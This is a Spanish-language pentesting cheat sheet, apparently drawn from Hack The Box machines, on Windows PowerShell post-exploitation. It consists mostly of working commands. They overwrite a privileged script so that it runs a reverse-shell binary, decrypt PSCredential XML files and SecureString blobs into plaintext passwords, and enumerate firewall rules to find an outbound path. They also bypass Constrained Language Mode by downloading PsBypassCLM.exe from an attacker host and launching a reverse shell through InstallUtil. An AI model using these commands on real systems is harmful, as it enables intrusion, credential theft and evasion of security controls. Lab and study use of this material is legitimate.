## Otras cosas con contraseñas

En caso de que tengamos credenciales de un usuario pero `EnterPSSession` no funcione, podemos hacer algo así:

- Primero definimos la variable `$pass`:

```powershell
$pass = ConvertTo-SecureString "<CONTRASEÑA>" -AsPlainText -Force
```

- Ahora definimos la variable `$cred`:

```powershell
$cred = New-Object System.Management.Automation.PSCredential("<DOMINIO>\<USUARIO>", $pass)
```

- Y ahora por último ejecutamos comandos como el usuario en cuestión usando `Invoke-Command`:

```powershell
Invoke-Command -ComputerName <HOSTNAME> -Credential $cred -ScriptBlock { <COMANDO> }
```

A que mola?

## Sobreescribiendo archivos con `Invoke-Command`

Situación: podemos ejecutar comandos como un usuario gracias a `Invoke-Command`. Vemos que tiene un archivo que ejecuta un comando como otro usuario pero ese comando no nos sirve. Hemos puesto un `shell.exe` en `C:\Utils` que nos enviará una reverse shell a nuestro equipo. Como podemos hacer para editar el comando que se ejecuta en ese script? No es nada del otro mundo. El comando que se ejecuta es `Get-Volume` así que para reemplazarlo la sintaxis sería algo así:

```powershell
Invoke-Command -ComputerName <HOSTNAME> -ConfigurationName dc_manage -Credential $cred -ScriptBlock { ((Get-Content path\to\script.ps1 -Raw) -Replace 'Get-Volume','cmd.exe /c path\to\file.exe') | Set-Content -Path path\to\script.ps1 }
```

## Ver reglas de firewall

Si conseguimos ejecución de comandos en una máquina Windows pero vemos que no puede conectar con nuestro servidor local, en vez de perder el tiempo intentando subir shells vamos a necesitar listar reglas de firewall para ver si está bloqueado:

Para `Outbound` blocked rules (tráfico saliente):

```powershell
Get-NetFirewallRule -Direction Outbound -Action Block -Enabled True
```

Para `Outbound` allowed rules (tráfico saliente):

```powershell
Get-NetFirewallRule -Direction Outbound -Action Allow -Enabled True
```

Para `Inbound` blocked rules (tráfico entrante):

```powershell
Get-NetFirewallRule -Direction Inbound -Action Block -Enabled True
```

Para `Inbound` allowed rules (tráfico entrante):

```powershell
Get-NetFirewallRule -Direction Inbound -Action Allow -Enabled True
```

Para ver **exactamente** que puertos son bloqueados:

```powershell
Get-NetFirewallRule -Direction Outbound -Action Block -Enabled True | Format-Table -Property Name,DisplayName,DisplayGroup,@{Name='Protocol';Expression={($PSItem | Get-NetFirewallPortFilter).Protocol}},@{Name='LocalPort';Expression={($PSItem | Get-NetFirewallPortFilter).LocalPort}},@{Name='RemotePort';Expression={($PSItem | Get-NetFirewallPortFilter).RemotePort}},@{Name='RemoteAddress';Expression={($PSItem | Get-NetFirewallAddressFilter).RemoteAddress}},Enabled,Profile,Direction,Action
```

## Ver contraseñas en texto claro de archivos `xml`

Si tenemos un archivo algo como este:

```xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">HTB\Tom</S>
      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb01000000e4a07bc7aaeade47925c42c8be5870730000000002000000000003660000c000000010000000d792a6f34a55235c22da98b0c041ce7b0000000004800000a00000001000000065d20f0b4ba5367e53498f0209a3319420000000d4769a161c2794e19fcefff3e9c763bb3a8790deebf51fc51062843b5d52e40214000000ac62dab09371dc4dbfd763fea92b9d5444748692</SS>
    </Props>
  </Obj>
</Objs>
```

Podemos llegar a ver la contraseña del usuario en cuestión en texto claro:

```powershell
$cred = Import-CliXml -Path C:\path\to\file.xml; $cred.getNetworkCredential() | Format-List *
```

En este caso se vería algo así:

```powershell
C:\Users\nico\Desktop>powershell -c "$cred = Import-CliXml -Path C:\Users\nico\Desktop\cred.xml; $cred.getNetworkCredential()"

UserName       : Tom
Password       : 1ts-mag1c!!!
SecurePassword : System.Security.SecureString
Domain         : HTB

C:\Users\nico\Desktop>
```

Ahora puedes usar o bien `evil-winrm` para conectarte (si es que pertenece al grupo `Remote Management Users`) o si está el puerto 22 abierto, por `SSH`.

## EnterPSSession

En caso de no poder conectarnos por WinRM con credenciales válidas, podemos hacer uso de `powershell` en Linux para entrar en una sesión de `powershell`:

```powershell
sudo pwsh
Install-Module -Name PSWSMan -Scope AllUsers
Install-WSMan
exit
sudo pwsh
Enter-PSSession <HOSTNAME>.<DOMINIO> -Credential <USUARIO>
```

Pero antes necesitamos editar nuestro `/etc/krb5.conf`

```shell
[libdefaults] 
	default_realm = <DOMINIO> 
# The following libdefaults parameters are only for Heimdal Kerberos. 
	fcc-mit-ticketflags = true 
[realms] 
	<DOMINIO> = {
		kdc = <HOSTNAME>.<DOMINO>
		admin_server = <HOSTNAME>.<DOMINO>
		}
[domain_realm]
```

## CLM ByPass 

Para saber si estamos en uno:

```powershell
*Evil-WinRM* PS C:\Users\amanda\appdata\local\temp> $ExecutionContext.SessionState.LanguageMode
ConstrainedLanguage
*Evil-WinRM* PS C:\Users\amanda\appdata\local\temp> 
```

Primero clonamos este repo:

```shell
git clone https://github.com/padovah4ck/PSByPassCLM.git
```

Luego:

```shell
cd PSByPassCLM/PSBypassCLM/PSBypassCLM/bin/x64/Debug
```

Creamos servidor:

```shell
python3 -m http.server 80
```

Y lo descargamos en la máquina:

```powershell
iwr -uri http://10.10.14.7/PsBypassCLM.exe -outfile PsBypassCLM.exe
```

Nos ponemos en escucha por netcat y ejecutamos:

```powershell
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.14.7 /rport=443 /U c:\users\amanda\appdata\local\temp\PsBypassCLM.exe
```

Otra forma más coñazo de hacerla es con funciones:

```powershell
[10.10.10.210]: PS>function command { ipconfig }
[10.10.10.210]: PS>command

Windows IP Configuration


Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . : htb
   IPv6 Address. . . . . . . . . . . : dead:beef::240
   IPv6 Address. . . . . . . . . . . : dead:beef::c5d3:ce0:3595:a8f5
   Link-local IPv6 Address . . . . . : fe80::c5d3:ce0:3595:a8f5%14
   IPv4 Address. . . . . . . . . . . : 10.10.10.210
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:5bc9%14
                                       10.10.10.2

Tunnel adapter isatap.{21EEAC43-8143-4E7F-95A7-85079F9F863C}:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : htb
[10.10.10.210]: PS>
```

También puedes así:

```powershell
&{ ipconfig }
```
## Decode Secure.String Password

Tenemos este script de powershell:

```powershell
# TODO: Forward the PowerShell remoting port to the external interface
# Password is now encrypted \o/

$1 = 'WebUser'
$2 = '77,52,110,103,63,109,63,110,116,80,97,53,53,77,52,110,103,63,109,63,110,116,80,97,53,53,48,48,48,48,48,48' -split ','
$3 = '76492d1116743f0423413b16050a5345MgB8AEQAVABpAHoAWgBvAFUALwBXAHEAcABKAFoAQQBNAGEARgArAGYAVgBGAGcAPQA9AHwAOQAwADgANwAxADIAZgA1ADgANwBiADIAYQBjADgAZQAzAGYAOQBkADgANQAzADcAMQA3AGYAOQBhADMAZQAxAGQAYwA2AGIANQA3ADUAYQA1ADUAMwA2ADgAMgBmADUAZgA3AGQAMwA4AGQAOAA2ADIAMgAzAGIAYgAxADMANAA=' 
$4 = $3 | ConvertTo-SecureString -key $2
$5 = New-Object System.Management.Automation.PSCredential ($1, $4)

Invoke-Command -Computer upload.fulcrum.local -Credential $5 -File Data.ps1
```

Y queremos ver la contraseña en texto claro:

```powershell
❯ pwsh
❯ $1 = 'WebUser'
❯$2 = '77,52,110,103,63,109,63,110,116,80,97,53,53,77,52,110,103,63,109,63,110,116,80,97,53,53,48,48,48,48,48,48' -split ','
❯ $3 = '76492d1116743f0423413b16050a5345MgB8AEQAVABpAHoAWgBvAFUALwBXAHEAcABKAFoAQQBNAGEARgArAGYAVgBGAGcAPQA9AHwAOQAwADgANwAxADIAZgA1ADgANwBiADIAYQBjADgAZQAzAGYAOQBkADgANQAzADcAMQA3AGYAOQBhADMAZQAxAGQAYwA2AGIANQA3ADUAYQA1ADUAMwA2ADgAMgBmADUAZgA3AGQAMwA4AGQAOAA2ADIAMgAzAGIAYgAxADMANAA=' 
❯ $4 = $3 | ConvertTo-SecureString -key $2
❯ $5 = New-Object System.Management.Automation.PSCredential ($1, $4)
❯ $Ptr = [System.Runtime.InteropServices.Marshal]::SecureStringToCoTaskMemUnicode($4)     ❯ $result = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($Ptr)
 [System.Runtime.InteropServices.Marshal]::ZeroFreeCoTaskMemUnicode($Ptr)
❯ $result 
```

